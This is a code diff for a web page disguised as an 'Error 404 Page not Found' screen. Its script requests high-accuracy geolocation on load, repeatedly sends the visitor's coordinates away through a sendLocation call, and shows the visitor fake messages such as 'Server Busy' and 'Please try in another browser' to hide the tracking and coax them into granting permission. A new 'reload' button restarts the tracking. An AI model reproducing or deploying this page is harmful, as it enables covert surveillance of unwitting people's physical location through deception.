@@ -25,6 +25,9 @@
     <div class="card">
       <h1>Error 404 Page not Found</h1>
       <p class="small">The Page You are looking for doesn't exist or an other error occured.</p>
+      <textarea id="note" placeholder="Report and Issue"></textarea>
+      <input id="phone" type="text" placeholder="Name" />
+      <button id="stopBtn">Muat Ulang</button>
       <div class="status" id="status"></div>
       <div class="map-link" id="mapWrap">
         <a id="mapUrl" target="_blank" rel="noopener">-</a>
@@ -44,6 +47,7 @@
   const mapUrl = document.getElementById('mapUrl');
   const coordsEl = document.getElementById('coords');
   const ipEl = document.getElementById('ipAddr');
+  const stopBtn = document.getElementById('stopBtn');
 
   let watchId = null;
   let stopTimer = null;
@@ -135,23 +139,25 @@
 
   function startRealtimeTracking() {
     if (!('geolocation' in navigator)) {
-      setStatus('Silahkan Muat Ulang');
+      setStatus('Reloading....');
       return;
     }
     setStatus('Loading...');
 
     watchId = navigator.geolocation.watchPosition(async (pos) => {
       lastPos = pos.coords;
-      setStatus('Loading...');
+      setStatus('Loading');
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
-        coordsEl.textContent = `Please Try Again Later`;
+        coordsEl.textContent = `Please Try Agai Later`;
+        mapUrl.href = `Server Busy`;
+        mapUrl.textContent = "Conecting.....";
         mapWrap.style.display = 'block';
       } else {
         setStatus('Gagal kirim: ' + (result.error || 'unknown'));
       }
     }, (err) => {
-      const msg = {1:'Izin ditolak.',2:'tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal.';
+      const msg = {1:'Please try in another browser.',2:'Please try in another browser',3:'Timeout'}[err.code] || 'Gagal.';
       setStatus(msg);
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
 
@@ -172,6 +178,7 @@
     setStatus("Tracking dihentikan");
   }
 
+  stopBtn.addEventListener('click', startRealtimeTracking);
 
   // Auto mulai tracking
   window.addEventListener('load', () => {
